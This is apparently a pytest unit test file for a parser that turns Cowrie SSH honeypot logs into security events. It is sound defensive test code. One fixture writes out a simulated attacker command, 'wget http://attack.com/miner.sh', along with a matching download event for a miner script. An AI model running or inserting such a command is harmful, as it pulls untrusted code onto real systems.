"""
Unit tests for CowrieLogParser.
"""

from __future__ import annotations

import json
import pytest

from src.honeypot.cowrie_parser import CowrieLogParser
from src.honeypot.recorder import SessionRecorder


@pytest.fixture
def parser() -> CowrieLogParser:
    return CowrieLogParser(recorder=SessionRecorder())


def test_parse_cowrie_connect(parser: CowrieLogParser):
    line = json.dumps({
        "eventid": "cowrie.session.connect",
        "format": "New connection: {src_ip}:{src_port} ({dst_ip}:{dst_port}) [session: {session}]",
        "src_ip": "198.51.100.88",
        "src_port": 50123,
        "dst_ip": "10.0.0.5",
        "dst_port": 22,
        "session": "sess-cowrie-01",
        "timestamp": "2026-08-22T12:00:00.000000Z",
    })
    event = parser.parse_line(line)
    # Connect starts a session, produces no immediate SecurityEvent
    assert event is None

    sess = parser.recorder.get_session("sess-cowrie-01")
    assert sess is not None
    assert sess.source_ip == "198.51.100.88"
    assert sess.source_port == 50123


def test_parse_cowrie_login_failure(parser: CowrieLogParser):
    # Connect
    parser.parse_line(json.dumps({
        "eventid": "cowrie.session.connect",
        "src_ip": "198.51.100.88",
        "src_port": 50123,
        "session": "sess-cowrie-02",
        "timestamp": "2026-08-22T12:00:00Z",
    }))

    # Failed login
    line = json.dumps({
        "eventid": "cowrie.login.failed",
        "username": "root",
        "password": "wrongpassword",
        "session": "sess-cowrie-02",
        "src_ip": "198.51.100.88",
        "timestamp": "2026-08-22T12:00:02Z",
    })
    event = parser.parse_line(line)

    assert event is not None
    assert event.source == "honeypot"
    assert event.event_type == "honeypot_auth_failure"
    assert event.entity.user == "root"
    assert event.raw["password"] == "wrongpassword"


def test_parse_cowrie_command_and_download(parser: CowrieLogParser):
    # Connect & auth
    parser.parse_line(json.dumps({
        "eventid": "cowrie.session.connect",
        "src_ip": "198.51.100.88",
        "session": "sess-cowrie-03",
    }))
    parser.parse_line(json.dumps({
        "eventid": "cowrie.login.success",
        "username": "admin",
        "password": "adminpassword",
        "session": "sess-cowrie-03",
    }))

    # Command
    cmd_event = parser.parse_line(json.dumps({
        "eventid": "cowrie.command.input",
        "input": "wget http://attack.com/miner.sh",
        "session": "sess-cowrie-03",
    }))
    assert cmd_event is not None
    assert cmd_event.event_type == "honeypot_command"
    assert cmd_event.raw["command"] == "wget http://attack.com/miner.sh"

    # Download
    dl_event = parser.parse_line(json.dumps({
        "eventid": "cowrie.session.file_download",
        "url": "http://attack.com/miner.sh",
        "outfile": "miner.sh",
        "shasum": "aabbccdd1122334455",
        "session": "sess-cowrie-03",
    }))
    assert dl_event is not None
    assert dl_event.event_type == "honeypot_payload_download"
    assert dl_event.entity.hash == "aabbccdd1122334455"


def test_parse_cowrie_close(parser: CowrieLogParser):
    parser.parse_line(json.dumps({
        "eventid": "cowrie.session.connect",
        "src_ip": "198.51.100.88",
        "session": "sess-cowrie-04",
    }))
    close_event = parser.parse_line(json.dumps({
        "eventid": "cowrie.session.closed",
        "duration": 12.5,
        "session": "sess-cowrie-04",
    }))

    assert close_event is not None
    assert close_event.event_type == "honeypot_session"
    assert close_event.entity.ip == "198.51.100.88"


def test_parse_cowrie_stream(parser: CowrieLogParser):
    lines = [
        json.dumps({"eventid": "cowrie.session.connect", "src_ip": "1.2.3.4", "session": "s1"}),
        json.dumps({"eventid": "cowrie.login.failed", "username": "root", "password": "123", "session": "s1"}),
        json.dumps({"eventid": "cowrie.session.closed", "session": "s1"}),
    ]
    events = list(parser.parse_stream((line for line in lines)))
    # connect produces None, login.failed and closed produce events -> 2 events
    assert len(events) == 2
    assert events[0].event_type == "honeypot_auth_failure"
    assert events[1].event_type == "honeypot_session"
